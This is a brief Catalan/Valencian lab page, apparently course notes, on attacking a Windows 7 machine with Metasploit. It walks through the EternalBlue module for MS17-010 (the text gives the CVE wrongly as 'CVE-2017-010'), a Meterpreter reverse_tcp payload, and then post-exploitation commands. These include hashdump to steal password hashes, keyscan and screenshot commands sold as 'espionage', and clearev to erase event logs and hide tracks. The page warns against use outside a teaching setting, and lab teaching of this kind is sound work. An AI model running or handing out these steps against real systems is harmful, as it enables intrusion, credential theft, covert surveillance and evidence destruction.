## En aesta pràctica prepararem la màquina `Windows 7 ` per a poder realitzar algunes activitats amb Metasploit.

!!!danger "Perill!!"
    No proveu açò fora d'un entorn didáctic. Podrieu cometrer un delicte...

## Explotar vulnerabilitat `CVE-2017-010` amb Eternalblue i Doublepulsar des de Metasploit

* Simplement utilitzem el següent exploit:

`use exploit/windows/smb/ms17_010_eternalblue`...i ens torna el control mitjançant un **shell o un Meterpreter** (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). 

* i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`

* i executem `exploit`

Ja estem dins...

* Comandaments que podem fer servir:
  * De sitema:
    * sysinfo
    * getuid
    * migrate `pid`
    * hashdump
    * upload/download
    * shell
    * sysinfo
  * De Espionatge
    * keyscan_start/keyscan_dump
    * screenshot/screenstreamer
  * Per a no deixar Rastre
    * clearev

Per supossat hi han prou més... convide a l'usuari a investigar-los, només heu de ficar dins de l'exploit: `help`.